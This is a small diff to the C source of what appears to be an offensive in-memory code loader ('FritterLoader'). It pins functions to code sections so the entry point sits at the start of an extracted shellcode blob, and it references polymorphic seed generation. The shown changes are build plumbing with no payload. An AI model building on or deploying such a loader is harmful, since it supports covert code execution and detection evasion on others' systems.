@@ -30,6 +30,7 @@
 */
 
 #include "loader.h"
+#include "poly_section.h"
 
 /* Fallback defaults if poly_seed.h was not generated (clean build before
    gen_poly ran). Live values come via the hash.h / encrypt.h
@@ -43,6 +44,12 @@
 
 DWORD MainProc(PFRITTER_INSTANCE inst);
 
+/* FritterLoader is the PE entry and must be at .text+0 in the
+   extracted blob. MSVC: pin to .text$a so /Gy COMDAT ordering puts it
+   first. mingw: -fno-toplevel-reorder handles it via source order. */
+#ifdef _MSC_VER
+__declspec(code_seg(".text$a"))
+#endif
 HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
     CreateThread_t     _CreateThread;
     GetThreadContext_t _GetThreadContext;
@@ -123,6 +130,7 @@ HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
     return h;
 }
 
+LOADER_FN_SECTION(".main_proc")
 DWORD MainProc(PFRITTER_INSTANCE inst) {
     ULONG                i, ofs;
     ULONG64              sig;
@@ -363,6 +371,7 @@ erase_memory:
     return 0;
 }
 
+LOADER_FN_SECTION(".ansi2unicode")
 int ansi2unicode(PFRITTER_INSTANCE inst, CHAR input[], WCHAR output[FRITTER_MAX_NAME]) {
     return inst->api.MultiByteToWideChar(CP_ACP, 0, input, 
       -1, output, FRITTER_MAX_NAME);
